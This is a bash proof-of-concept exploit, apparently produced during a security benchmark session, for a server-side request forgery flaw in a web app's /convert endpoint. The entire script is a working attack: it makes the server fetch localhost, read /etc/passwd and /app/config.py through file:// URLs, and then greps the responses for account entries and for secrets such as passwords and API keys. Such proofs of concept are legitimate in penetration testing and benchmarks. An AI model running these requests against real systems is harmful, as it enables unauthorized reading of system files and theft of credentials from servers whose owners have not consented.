#!/bin/bash
# POC: Demonstrates SSRF vulnerability in /convert endpoint allowing local file access via file:// protocol and arbitrary URL fetching
# Target: ./repo
# Created: 2025-11-04T17:29:49.774Z
# Session: benchmark-XBEN-033-24-mhkubvue

# SSRF Vulnerability POC - Local File Read via file:// Protocol
# Tests the /convert endpoint for Server-Side Request Forgery vulnerability
# This POC demonstrates the ability to read local files via file:// protocol

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-80}"
TARGET_URL="http://${TARGET_HOST}:${TARGET_PORT}"

echo "================================================"
echo "SSRF Vulnerability POC - Local File Read"
echo "================================================"
echo "Target: ${TARGET_URL}"
echo ""

# Test 1: Fetch from localhost (localhost SSRF)
echo "[*] Test 1: Fetching from localhost/convert endpoint..."
echo "[*] Command: curl -X POST ${TARGET_URL}/convert -d 'url=http://127.0.0.1:${TARGET_PORT}'"
echo ""

RESPONSE1=$(curl -s -X POST "${TARGET_URL}/convert" -d "url=http://127.0.0.1:${TARGET_PORT}" -w "\n%{http_code}")
HTTP_CODE1=$(echo "$RESPONSE1" | tail -n 1)
BODY1=$(echo "$RESPONSE1" | sed '$d')

echo "[+] HTTP Status Code: $HTTP_CODE1"
if [ "$HTTP_CODE1" = "200" ]; then
    echo "[+] Status 200 OK - Response received"
    if echo "$BODY1" | grep -q "html\|DOCTYPE\|<body"; then
        echo "[+] VULNERABLE: Response contains HTML content from localhost"
        echo "[+] Sample Response (first 500 chars):"
        echo "$BODY1" | head -c 500
        echo ""
        echo ""
    fi
else
    echo "[-] Unexpected status code: $HTTP_CODE1"
fi

echo ""
echo "================================================"
echo ""

# Test 2: Read /etc/passwd via file:// protocol
echo "[*] Test 2: Attempting to read /etc/passwd via file:// protocol..."
echo "[*] Command: curl -X POST ${TARGET_URL}/convert -d 'url=file:///etc/passwd'"
echo ""

RESPONSE2=$(curl -s -X POST "${TARGET_URL}/convert" -d "url=file:///etc/passwd" -w "\n%{http_code}")
HTTP_CODE2=$(echo "$RESPONSE2" | tail -n 1)
BODY2=$(echo "$RESPONSE2" | sed '$d')

echo "[+] HTTP Status Code: $HTTP_CODE2"
if [ "$HTTP_CODE2" = "200" ]; then
    echo "[+] Status 200 OK - Response received"
    if echo "$BODY2" | grep -q "root:"; then
        echo "[+] CRITICAL VULNERABILITY: Successfully read /etc/passwd!"
        echo "[+] File contents:"
        echo "$BODY2" | grep -E "root:|daemon:|bin:" | head -n 5
        echo ""
    elif echo "$BODY2" | grep -q "result\|convert"; then
        echo "[+] VULNERABLE: file:// protocol is supported"
        echo "[+] Response contains content from file attempt"
        echo "[+] Sample Response (first 300 chars):"
        echo "$BODY2" | head -c 300
        echo ""
    fi
else
    echo "[-] Status code: $HTTP_CODE2 (may indicate blocked or error)"
fi

echo ""
echo "================================================"
echo ""

# Test 3: Read application config (if accessible)
echo "[*] Test 3: Attempting to read common config files..."
echo "[*] Command: curl -X POST ${TARGET_URL}/convert -d 'url=file:///app/config.py'"
echo ""

RESPONSE3=$(curl -s -X POST "${TARGET_URL}/convert" -d "url=file:///app/config.py" -w "\n%{http_code}")
HTTP_CODE3=$(echo "$RESPONSE3" | tail -n 1)
BODY3=$(echo "$RESPONSE3" | sed '$d')

echo "[+] HTTP Status Code: $HTTP_CODE3"
if [ "$HTTP_CODE3" = "200" ]; then
    if echo "$BODY3" | grep -q "SECRET\|PASSWORD\|API_KEY\|DATABASE"; then
        echo "[+] CRITICAL: Config file with sensitive data found!"
        echo "$BODY3" | head -c 400
        echo ""
    else
        echo "[+] file:// protocol supported for config files"
    fi
fi

echo ""
echo "================================================"
echo "POC Complete"
echo "================================================"